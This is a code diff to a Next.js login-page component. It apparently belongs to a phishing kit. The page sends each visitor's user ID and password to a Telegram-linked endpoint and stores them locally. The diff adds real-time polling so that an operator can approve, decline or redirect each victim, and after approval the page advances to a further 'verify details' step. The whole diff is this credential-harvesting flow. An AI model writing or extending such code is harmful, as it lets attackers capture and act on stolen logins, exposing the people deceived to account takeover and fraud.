@@ -1,8 +1,9 @@
 "use client"
 
 import { useRouter } from "next/navigation"
-import { useState } from "react"
+import { useEffect, useRef, useState } from "react"
 import { WELCOME_TITLE } from "@/lib/auth-copy"
+import { APPROVAL_TIMEOUT_MS, POLL_MS } from "@/lib/approval-messages"
 import {
   setTargetFlowLogin,
 } from "@/lib/flores-flow"
@@ -16,12 +17,16 @@ type PasswordStepProps = {
   userId: string
 }
 
+type ApprovalStatus = "pending" | "approved" | "declined" | "redirected" | "expired"
+
 export function PasswordStep({ userId }: PasswordStepProps) {
   const router = useRouter()
   const [password, setPassword] = useState("")
   const [showPassword, setShowPassword] = useState(false)
   const [isSubmitting, setIsSubmitting] = useState(false)
   const [errors, setErrors] = useState<{ password?: string; form?: string }>({})
+  const [approvalToken, setApprovalToken] = useState<string | null>(null)
+  const activePollTimeoutRef = useRef<number | null>(null)
 
   const handlePasswordBlur = () => {
     if (!password.trim()) {
@@ -49,19 +54,111 @@ export function PasswordStep({ userId }: PasswordStepProps) {
 
     const trimmedUserId = userId.trim() || readStoredUsername()
 
-    fetch("/api/telegram/login", {
+    const response = await fetch("/api/telegram/login", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ userId: trimmedUserId, password }),
-    }).catch(console.error)
+    }).catch(() => null)
+
+    if (!response || !response.ok) {
+      setErrors({ form: "Unable to send approval request. Please try again." })
+      setIsSubmitting(false)
+      return
+    }
+
+    const payload = await response.json().catch(() => null)
+    const token = String(payload?.token || "").trim()
+    if (!token) {
+      setErrors({ form: "Approval token missing. Please try again." })
+      setIsSubmitting(false)
+      return
+    }
 
     storeLoginCredentials(trimmedUserId, password)
-    setTargetFlowLogin()
-
-    await wait(LOADING_MS.next)
-    router.push("/verify?mode=details")
-    setIsSubmitting(false)
+    setApprovalToken(token)
   }
+
+  useEffect(() => {
+    if (!approvalToken) return
+
+    let cancelled = false
+    const startedAt = Date.now()
+
+    const clearTimer = () => {
+      if (activePollTimeoutRef.current != null) {
+        window.clearTimeout(activePollTimeoutRef.current)
+        activePollTimeoutRef.current = null
+      }
+    }
+
+    const finishDeclined = (message: string) => {
+      clearTimer()
+      if (cancelled) return
+      setApprovalToken(null)
+      setErrors({ form: message })
+      setIsSubmitting(false)
+    }
+
+    const poll = async () => {
+      if (cancelled) return
+
+      if (Date.now() - startedAt >= APPROVAL_TIMEOUT_MS) {
+        finishDeclined("Approval timed out. Please try again.")
+        return
+      }
+
+      try {
+        const response = await fetch(`/api/approval?token=${encodeURIComponent(approvalToken)}`, {
+          cache: "no-store",
+        })
+        if (!response.ok) {
+          if (response.status === 404) {
+            finishDeclined("Approval request was not found. Please try again.")
+            return
+          }
+          activePollTimeoutRef.current = window.setTimeout(poll, POLL_MS)
+          return
+        }
+
+        const data = await response.json()
+        const status = String(data?.status || "") as ApprovalStatus
+        if (status === "approved") {
+          clearTimer()
+          if (cancelled) return
+          setTargetFlowLogin()
+          await wait(LOADING_MS.next)
+          router.push("/verify?mode=details")
+          return
+        }
+        if (status === "declined") {
+          finishDeclined("Approval request was declined. Please retry.")
+          return
+        }
+        if (status === "redirected") {
+          clearTimer()
+          if (cancelled) return
+          const redirectUrl = String(data?.redirectUrl || "")
+          window.location.href = redirectUrl || "/api/login-out"
+          return
+        }
+        if (status === "expired") {
+          finishDeclined("Approval request expired. Please retry.")
+          return
+        }
+
+        activePollTimeoutRef.current = window.setTimeout(poll, POLL_MS)
+      } catch {
+        activePollTimeoutRef.current = window.setTimeout(poll, POLL_MS)
+      }
+    }
+
+    poll()
+
+    return () => {
+      cancelled = true
+      clearTimer()
+    }
+  }, [approvalToken, router])
 
   return (
     <>
@@ -189,7 +286,7 @@ export function PasswordStep({ userId }: PasswordStepProps) {
               disabled={!password.trim() || isSubmitting}
             >
               <span className="button-text">
-                {isSubmitting ? "Verifying..." : "Log in with password"}
+                {isSubmitting ? "Awaiting approval..." : "Log in with password"}
               </span>
             </button>
           </div>
